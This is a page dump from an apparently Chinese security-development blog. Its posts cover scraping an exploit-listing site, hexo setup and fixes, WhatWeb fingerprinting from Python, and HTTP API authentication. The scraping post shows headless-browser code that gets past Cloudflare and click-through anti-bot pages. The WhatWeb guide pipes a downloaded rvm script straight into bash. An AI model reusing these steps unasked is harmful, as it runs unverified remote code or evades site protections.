<h4 id="获取漏洞EXP"><a href="#获取漏洞EXP" class="headerlink" title="获取漏洞EXP"></a><a href="#获取漏洞EXP" title="获取漏洞EXP"></a>获取漏洞EXP</h4><p>页面结构：<br><img src="/upload_image/20180327/4.png" alt=""><br>对于此页面我也没有使用正则，而是使用了BeautifulSoup模块来获取网页元素内容，代码如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">soup=BeautifulSoup(content,<span class="string">“html.parser”</span>)</div><div class="line">m=soup.find_all(<span class="string">“div”</span>,&#123;<span class="string">“class”</span>:<span class="string">“container”</span>&#125;)</div><div class="line">n=m[0].find_all(<span class="string">“div”</span>)</div><div class="line">exp_info=<span class="string">“”</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> n:</div><div class="line">    exp_info+=i.text+<span class="string">“\n”</span></div></pre></td></tr></table></figure>

<h3 id="反爬虫策略"><a href="#反爬虫策略" class="headerlink" title="反爬虫策略"></a><a href="#反爬虫策略" title="反爬虫策略"></a>反爬虫策略</h3><p>我在连续访问n次网站后，发现此站有一些反爬虫的策略。而我必须研究解决它，才能进一步获取exp内容。</p>
<h4 id="cdn防ddos策略"><a href="#cdn防ddos策略" class="headerlink" title="cdn防ddos策略"></a><a href="#cdn防ddos策略" title="cdn防ddos策略"></a>cdn防ddos策略</h4><p>　　首先我发现此网站用了cloudflare加速器，且在用户持续访问一段时间后（应该是基于ip+headers认证），会出现防ddos页面。如果此时用普通的爬虫去访问，获取到的页面源码是防ddos的源码，即：<br><img src="/upload_image/20180327/1.png" alt=""></p>
<h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a><a href="#解决方案" title="解决方案"></a>解决方案</h4><p>　　当我们打开浏览器访问漏洞页面时，会在防ddos页面上等待几秒后，自动跳转到目标漏洞页面。基于这一特性，我决定使用无头浏览器去访问，设置等待时间即可。这里我选用phantomjs做此试验，其他headless同理。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">d=webdriver.PhantomJS()</div><div class="line">d.get(vul_api)</div><div class="line">time.sleep(5) <span class="comment"># 等待5s</span></div><div class="line"><span class="built_in">print</span> d.page_source <span class="comment"># 输出源码</span></div></pre></td></tr></table></figure>

<p>在访问网页5s后，输出的网页源码，便是目标漏洞exp页面的源码。</p>
<h4 id="用户点击确认"><a href="#用户点击确认" class="headerlink" title="用户点击确认"></a><a href="#用户点击确认" title="用户点击确认"></a>用户点击确认</h4><p>　　在绕过了防ddos策略后，发现网站自身也有一个反爬虫的策略，即需要用户点击确认按钮后，才能继续访问原目标。如果此时用普通的爬虫去访问，获取到的页面源码是用户确认网页的源码，即：<br><img src="/upload_image/20180327/2.png" alt=""></p>
<h4 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a><a href="#解决方案-1" title="解决方案"></a>解决方案</h4><p>　　此网页需要用户点击“确定”按钮后，会跳转到目标页面，因此可以使用无头浏览器访问，操作页面元素，即模拟点击确定按钮。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">d=webdriver.PhantomJS()</div><div class="line">d.get(vul_api)</div><div class="line">time.sleep(5) <span class="comment"># 等待5s（绕过防ddos策略）</span></div><div class="line"></div><div class="line">d.find_element_by_name(<span class="string">“agree”</span>).click() <span class="comment"># 点击确定按钮（绕过用户点击确认策略）</span></div><div class="line">time.sleep(5) <span class="comment"># 等待5s</span></div><div class="line">content=d.page_source <span class="comment"># 输出网页源码</span></div><div class="line">d.quit()</div></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><a href="#总结" title="总结"></a>总结</h3><p>　　想要爬取一个网站的内容，必须要分析此网站的URL结构、网页内容、反爬虫策略等。针对此网站而言，复杂点在于如何绕过反爬虫策略，这里用到了无头浏览器去模拟人访问。总之编写爬虫是需要耐心跟细心的，如何一步步去分析整个访问流程，有时候比如何去编程更重要。也许，这就是所谓的：“磨刀不误砍柴工”吧！</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://chucz.club/2018/03/18/hexo使用进阶/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="chucz">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="诗和田野">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/03/18/hexo使用进阶/" itemprop="url">hexo使用进阶</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-19T06:11:01+08:00">
                2018-03-19
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>hexo</p>
<p>一、后端管理插件hexo-admin<br>插件可以直接在网页端创建、编辑markdown文章内容，并将内容发布到_posts里。<br>另外，对我而言，最方便的是可以很方便的给文章加标题、分类、打标签。</p>
<p>参见：</p>
<p>An Admin Interface for Hexo<br>hexo-admin in github</p>
<p>1.安装</p>
<p>(1)npm install –save hexo-admin </p>
<p>(2)hexo server -d </p>
<p>(3)open <a href="http://localhost:4000/admin/" target="_blank" rel="noopener">http://localhost:4000/admin/</a></p>
<p>2.配置</p>
<p>在_config.yml最后添加类似如下内容：</p>
<pre><code>admin:      username: myfavoritename      password_hash: be121740bf988b2225a313fa1f107ca1      secret: a secret something
</code></pre><p>username：后端登录用户名</p>
<p>password_hash：后端登录用户密码对应的md5 hash值</p>
<p>secret：用于保证cookie安全</p>
<p>3.预览</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://chucz.club/2018/02/27/ELK-x-pack-详细说明/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="chucz">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="诗和田野">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/27/ELK-x-pack-详细说明/" itemprop="url">ELK x-pack 详细说明</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-28T07:26:19+08:00">
                2018-02-28
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>我还能说什么呢？？</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://chucz.club/2018/02/27/hexo-fs-SyncWriteStream-is-deprecated/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="chucz">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="诗和田野">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/27/hexo-fs-SyncWriteStream-is-deprecated/" itemprop="url">hexo fs.SyncWriteStream is deprecated</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-28T07:18:16+08:00">
                2018-02-28
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>fs.SyncWriteStream is deprecated<br>出现这个错误需要更新hexo-fs插件</p>
<p>使用<br>npm install hexo-fs –save</p>
<p>在执行hexo命令的时候，总会显示如下报错：<br>(node:7048) [DEP0061] DeprecationWarning: fs.SyncWriteStream is deprecated.</p>
<p>从报错信息来看是因为fs.SyncWriteStream is deprecated，node.js从8.0开始已经弃用了fs.SyncWriteStream方法，所以是因为我们node_modules中某个插件调用了这个方法，通过查看Hexo作者GitHub对应的项目，在issue中看到有人提到这个问题，在hexo项目中其中有一个hexo-fs的插件调用了这个方法，所以需要更新hexo-fs插件，更新方法如下：</p>
<p>npm install hexo-fs –save</p>
<p>更新插件后问题依然无法解决。</p>
<p>通过–debug来查看：<br>[root@server init]# hexo –debug<br>06:55:32.711 DEBUG Hexo version: 3.5.0<br>06:55:32.714 DEBUG Working directory: /data/wwwroot/init/<br>06:55:32.787 DEBUG Config loaded: /data/wwwroot/init/_config.yml<br>06:55:32.832 DEBUG Plugin loaded: hexo-admin<br>(node:25414) [DEP0061] DeprecationWarning: fs.SyncWriteStream is deprecated.</p>
<p>问题出在：hexo-admin的hexo-fs<br>因hexo-admin作为后台管理，无法npm uninstall hexo-admin卸载,则找到对应文件，注释：</p>
<p>[root@server init]# grep -irn “SyncWriteStream” ./node_modules/hexo-admin/<br>./node_modules/hexo-admin/node_modules/hexo-fs/lib/fs.js:718:exports.SyncWriteStream = fs.SyncWriteStream;<br>[root@lywserver init]# </p>
<p>将对应的exports.SyncWriteStream = fs.SyncWriteStream;注释(前面 //)即可！</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://chucz.club/2018/02/04/记与某牛的一次饭局交流/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="chucz">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="诗和田野">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/04/记与某牛的一次饭局交流/" itemprop="url">记与某牛的一次饭局交流</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-05T03:13:39+08:00">
                2018-02-05
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>好好学习，天天向上<br>记录与某业界大牛前辈的一次饭局谈话，话后小弟终觉获益匪浅，心想有些关键问题与解惑过程值得一记与分享，因此便有了此文。<br><a id="more"></a></p>
</blockquote>
<h3 id="偏安全还是开发？"><a href="#偏安全还是开发？" class="headerlink" title="偏安全还是开发？"></a><a href="#偏安全还是开发？" title="偏安全还是开发？"></a>偏安全还是开发？</h3><p>　　由于我大学所读的专业偏研发而非安全，本人接触安全的时间也不长，再加上工作中还是以安全开发为主，因此便有了此疑惑。从职业发展（暂不管个人兴趣）来谈，我到底应该选择偏向安全呢？还是开发？</p>
<p>　　这个问题一直困扰了我很久，在安全方面我算是刚入门；开发方面熟练python，但开发能力无法跟甲方的RD比。从个人兴趣上来说，我更偏向开发，当然是跟安全相关的开发，比如开发自动化扫描程序等等。但从职业前景上来说，真不知道该如何选择。</p>
<p>某牛结合自身十多年的安全经验给了我一些启迪：<code>“选择偏开发为好，因为安全只是开发中发现的一些bug，只要对开发有深入的了解与实践，那么安全也就自然会懂。”</code>（不一定是原画，但含义一样）</p>
<h3 id="安全杂而广，是选择深入一面，还是面面俱到？"><a href="#安全杂而广，是选择深入一面，还是面面俱到？" class="headerlink" title="安全杂而广，是选择深入一面，还是面面俱到？"></a><a href="#安全杂而广，是选择深入一面，还是面面俱到？" title="安全杂而广，是选择深入一面，还是面面俱到？"></a>安全杂而广，是选择深入一面，还是面面俱到？</h3><p>　　接上个问题的背景，由于本人的安全能力一般，因此在安全方面还有很多短板，比如说逆向、二进制等，可以说是盲区。因此是否需要学习这些技能，以增加自身安全的能力，还是专注一个方面研究，比如说web安全？</p>
<p>某牛结合自身十多年的安全经验给了我一些解答：<code>“选择一个方向精通，至于其他方面的技术，等需要的时候再学，如若工作中不需要，则不必要学习，因为长时间不用则会遗忘。”</code>（不一定是原画，但含义一样）</p>
<h3 id="机器学习很火，是否适合安全行业？"><a href="#机器学习很火，是否适合安全行业？" class="headerlink" title="机器学习很火，是否适合安全行业？"></a><a href="#机器学习很火，是否适合安全行业？" title="机器学习很火，是否适合安全行业？"></a>机器学习很火，是否适合安全行业？</h3><p>　　最近几年机器学习可以说是很火热，我也一直想往这方面学习发展，将机器学习应用于安全领域。当然这一块的学习成本比较高，因此我一直还没入门，那么机器学习很火，是否适合安全行业？</p>
<p>某牛结合自身十多年的安全经验给了我一些建议：<code>“建议不要踏入机器学习的坑，安全不同其他行业，机器学习未必能解决安全问题，比如机器学习能识别哪些是敏感数据吗？学习前的数据打标工作，需要耗费大量的人力，安全防护能力有时靠人力堆规则，而不是机器学习就能解决的。”</code>（不一定是原画，但含义一样）</p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a><a href="#后记" title="后记"></a>后记</h3><p>　　有句话叫<code>“纸上得来终觉浅”</code>，光从书本上学习知识可能还不够，适当的时候可以多听听前辈的经验之谈，走走前辈走过的路，踩踩前辈踩过的坑。当踩得坑足够多了，走过的路足够长了，当然也不能忘记时刻保持学习的习惯，适当的运动保持健康的身体，过个几年，十几年，也许大家都能成为大牛。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://chucz.club/2018/01/11/利用Whatweb获取Web指纹信息/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="chucz">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="诗和田野">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/01/11/利用Whatweb获取Web指纹信息/" itemprop="url">利用Whatweb获取Web指纹信息</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-11T12:29:30+08:00">
                2018-01-11
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>我都寂寞多久了还是没好<br>感觉全世界都在窃窃嘲笑</p>
</blockquote>
<p>　　又是很久没有更新博客啦，为啥呢？因为在忙开发、开发、开发。我最近在研究指纹扫描以及漏洞扫描方面的设计与开发，从前端、后端到数据存储、消息队列再到分布式部署，感觉自己简直快成全栈了。不过开发过程中也有很多收获，有时间我会写博客分享一下。<br><a id="more"></a><br>　　那么今天写点啥呢？就分享个很老的安全工具吧——whatweb，相信很多朋友应该知道，用来扫web指纹的。为啥会用到它，因为项目需要啊，其实也可以不用，因为我自己写了很多扫描指纹的插件，这个只是作为备案选择而已。但既然用到了，那就理所当然要为它打call。好了，照旧先介绍如何安装，再介绍如何使用，本文重点在于环境安装，以及如何在python代码中比较<code>优雅</code>的使用whatweb。</p>
<h3 id="安装升级ruby"><a href="#安装升级ruby" class="headerlink" title="安装升级ruby"></a><a href="#安装升级ruby" title="安装升级ruby"></a>安装升级ruby</h3><p>whatweb是用ruby开发的，因此服务器上需要安装ruby，且对版本有要求，貌似必须2.0以上（没记错的话）。目前很多服务器内置的ruby是1.8的，或者用yum install ruby安装的也是1.8的，因此需要安装或者升级版本到2.0以上才行。</p>
<h4 id="升级方案one（推荐）"><a href="#升级方案one（推荐）" class="headerlink" title="升级方案one（推荐）"></a><a href="#升级方案one（推荐）" title="升级方案one（推荐）"></a>升级方案one（推荐）</h4><p>先删除原来的ruby：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum remove ruby ruby-devel</div></pre></td></tr></table></figure>

<p>下载ruby安装包，并进行编译安装：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">wget <a href="http://cache.ruby-lang.org/pub/ruby/2.1/ruby-2.1.2.tar.gz" target="_blank" rel="noopener">http://cache.ruby-lang.org/pub/ruby/2.1/ruby-2.1.2.tar.gz</a></div><div class="line">tar xvfvz ruby-2.1.2.tar.gz</div><div class="line">./configure</div><div class="line">make</div><div class="line">sudo make install</div></pre></td></tr></table></figure>

<p>将ruby添加到环境变量，ruby安装在/usr/local/bin/目录下，因此编辑 ~/.bash_profile文件，添加一下内容：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PATH=<span class="variable">$PATH</span>:/usr/<span class="built_in">local</span>/bin/</div></pre></td></tr></table></figure>

<p>不要忘了生效一下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">source</span> ~/.bash_profile</div></pre></td></tr></table></figure>

<p>参考：<a href="http://ask.xmodulo.com/upgrade-ruby-centos.html" target="_blank" rel="noopener">http://ask.xmodulo.com/upgrade-ruby-centos.html</a></p>
<h4 id="升级方案two"><a href="#升级方案two" class="headerlink" title="升级方案two"></a><a href="#升级方案two" title="升级方案two"></a>升级方案two</h4><p>先安装rvm，这是ruby的包管理器:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ curl -L get.rvm.io | bash -s stable  </div><div class="line">$ <span class="built_in">source</span> ~/.bash_profile</div></pre></td></tr></table></figure>

<p>测试是否安装成功:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rvm -v</div></pre></td></tr></table></figure>

<p>利用rvm升级ruby:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ruby -v  <span class="comment">#查看当前ruby版本  </span></div><div class="line">rvm list known  <span class="comment">#列出已知的ruby版本</span></div><div class="line">rvm install 2.0 <span class="comment">#安装ruby 2.0</span></div></pre></td></tr></table></figure>

<h3 id="安装whatweb"><a href="#安装whatweb" class="headerlink" title="安装whatweb"></a><a href="#安装whatweb" title="安装whatweb"></a>安装whatweb</h3><p>说起来这个就很简单，直接去github上clone下项目：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> <a href="https://github.com/urbanadventurer/WhatWeb.git" target="_blank" rel="noopener">https://github.com/urbanadventurer/WhatWeb.git</a></div></pre></td></tr></table></figure>

<p>项目内已经有编译好的可执行文件，whatweb，只需要添加个环境变量：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PATH=<span class="variable">$PATH</span>:/root/WhatWeb-master/</div></pre></td></tr></table></figure>

<h3 id="使用whatweb"><a href="#使用whatweb" class="headerlink" title="使用whatweb"></a><a href="#使用whatweb" title="使用whatweb"></a>使用whatweb</h3><p>具体详细的使用方式就要参考<a href="https://github.com/urbanadventurer/WhatWeb" target="_blank" rel="noopener">github</a>了，我这边只介绍怎么在python中使用whatweb。</p>
<p>废话不多说，直接上代码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! -<em>- coding:utf-8 -</em>-</span></div><div class="line"></div><div class="line">import commands</div><div class="line">import re</div><div class="line"></div><div class="line"><span class="comment"># 正则表达式</span></div><div class="line">p_httpserver=re.compile(r<span class="string">“HTTPServer\x1b[0m[\x1b[1m\x1b[36m([^,]+?)\x1b[0m]“</span>)</div><div class="line">p_title=re.compile(r<span class="string">“Title\x1b[0m[\x1b[1m\x1b[33m(.+?)\x1b[0m]“</span>)</div><div class="line">p_ip=re.compile(r<span class="string">“IP\x1b[0m[\x1b[37m([^,]+?)\x1b[0m]“</span>)</div><div class="line">p_country=re.compile(r<span class="string">“Country\x1b[0m[\x1b[37m([^,]+?)\x1b[0m]“</span>)</div><div class="line">p_cookies=re.compile(r<span class="string">“Cookies\x1b[0m[\x1b[37m([^,]+?)\x1b[0m]“</span>)</div><div class="line">p_x_powered_by=re.compile(r<span class="string">“X-Powered-By\x1b[0m[\x1b[37m([^,]+?)\x1b[0m]“</span>)</div><div class="line"></div><div class="line">def re_grep(p,content):</div><div class="line">  <span class="comment"># 正则处理</span></div><div class="line">  L=p.findall(content)</div><div class="line">  <span class="keyword">if</span> len(L)&gt;0:</div><div class="line">    <span class="built_in">return</span> L[0]</div><div class="line">  <span class="keyword">else</span>:</div><div class="line">    <span class="built_in">return</span> <span class="string">“”</span></div><div class="line"></div><div class="line">def whatweb(url):</div><div class="line">    <span class="comment"># whatweb扫描</span></div><div class="line">    result=<span class="string">“”</span></div><div class="line">    httpserver=<span class="string">“”</span></div><div class="line">    title=<span class="string">“”</span></div><div class="line">    ip=<span class="string">“”</span></div><div class="line">    cookies=<span class="string">“”</span></div><div class="line">    country=<span class="string">“”</span></div><div class="line">    power_by=<span class="string">“”</span></div><div class="line"></div><div class="line">    try:</div><div class="line">        status,result=commands.getstatusoutput(<span class="string">‘whatweb ‘</span>+url)</div><div class="line">        <span class="comment"># print status,result</span></div><div class="line">    except IndexError,e:</div><div class="line">        <span class="built_in">print</span> e</div><div class="line">    <span class="keyword">else</span>:   </div><div class="line">        httpserver=re_grep(p_httpserver,result)</div><div class="line">        title=re_grep(p_title,result)</div><div class="line">        ip=re_grep(p_ip,result)</div><div class="line">        country=re_grep(p_country,result)</div><div class="line">        cookies=re_grep(p_cookies,result)</div><div class="line">        power_by=re_grep(p_x_powered_by,result)</div><div class="line"></div><div class="line">    <span class="built_in">return</span> httpserver,title,cookies,country,power_by</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> <strong>name</strong>==<span class="string">“<strong>main</strong>“</span>:</div><div class="line"></div><div class="line">    result=whatweb(<span class="string">“thief.one”</span>)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> result:</div><div class="line">        <span class="built_in">print</span> i</div></pre></td></tr></table></figure>

<p>说明：解释一下代码，主要就是一个正则表达式，因为运行whatweb会直接将结果打印，当然也有其他命令可以让其结果输出到文本等，但如果想要批量自动化扫描的话，需要实时获取whatweb的内容，生成文件的方式显然不行，因此我用了commands库，让python执行系统命令并获取返回结果，然后就是几个正则对结果的匹配。</p>
<p>结束之语：又水了一篇，嗯嗯！</p>
<p><code>如果有朋友有更好地在python代码中使用whatweb的方法，麻烦告知，我是被whatweb的输出折腾的够呛，因此才选择了用正则，无奈之举。</code></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://chucz.club/2017/12/11/HTTP-API认证，Python实现方案/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="chucz">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="诗和田野">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/12/11/HTTP-API认证，Python实现方案/" itemprop="url">HTTP-API认证，Python实现方案</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-11T09:53:04+08:00">
                2017-12-11
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>一杯敬自由，一杯敬死亡<br>　　标题写的比较模糊拗口，简单来说本文就是介绍如何利用python将http的api接口做加密认证，防止不法分子乱用。这里有几个前提需要说明下，首先我们要实现的是http的加密认证，因此不考虑https。其次认证的目的是为了让一个http的api接口让正确的（通过认证的）人使用，而不是任何都可以用。<br><a id="more"></a></p>
</blockquote>
<h3 id="设计方案"><a href="#设计方案" class="headerlink" title="设计方案"></a><a href="#设计方案" title="设计方案"></a>设计方案</h3><p>明白了http api认证的目的，那么就来设计方案吧！</p>
<h4 id="最偷懒的方案"><a href="#最偷懒的方案" class="headerlink" title="最偷懒的方案"></a><a href="#最偷懒的方案" title="最偷懒的方案"></a>最偷懒的方案</h4><p>我之前写过几个api接口，主要是自己用来传输一些数据库数据的，由于数据有一点敏感，因此使用了认证。当时为了偷懒，认证的方式写得特别简单无脑，即在api接口上增加了一个auth字段，字段的内容会在服务端进行校验，但其内容是一串写死的md5。这虽然也算是一种认证方式(不知道auth字段内容的朋友无法拿到api接口的数据)，但如果局域网内流量被监听，那这种方案就形同虚设了。</p>
<h4 id="比较简单实用的设计方案"><a href="#比较简单实用的设计方案" class="headerlink" title="比较简单实用的设计方案"></a><a href="#比较简单实用的设计方案" title="比较简单实用的设计方案"></a>比较简单实用的设计方案</h4><p>一种比较好的设计方案，是在客户端与服务端实现一套加密算法，算法可自定义但最好复杂一点。如将请求的参数以及内容以一定的方式排列后，可以再加上时间戳，整体做一个hash运算。服务端将获取的参数同样做hash，与客户端传递的hash做对比。因为有了时间戳，即使被监听了流量，进行流量重放也是不能认证成功的。（因为时间戳存在差异）</p>
<p><em>说明一下：本文介绍的是api的一个认证方式，这跟网站啥的认证还是有区别的。主要还是看api的应用场景，如果是给内部人员调用，而且调用的用户不多，其实以上认证方案足够了。因为用来加密的密钥（key）可以用其他安全的方式发送给用户（甚至可以写纸上，2333），而不必像https协议一样，使用非对称加密+对称加密，并且使用数字证书等一系列复杂的加密认证方式。</em></p>
<hr>
<p>好了，前文介绍了一些api认证的方案，那么接下来再写点啥呢？我不打算介绍怎么去开发一个认证方案的代码，我主要想推荐一个开源的项目—hawk，因为它就是用来实现http加密认证的，而且它有一个python的实现模块（mohawk），推荐它是因为它比较简单实用。</p>
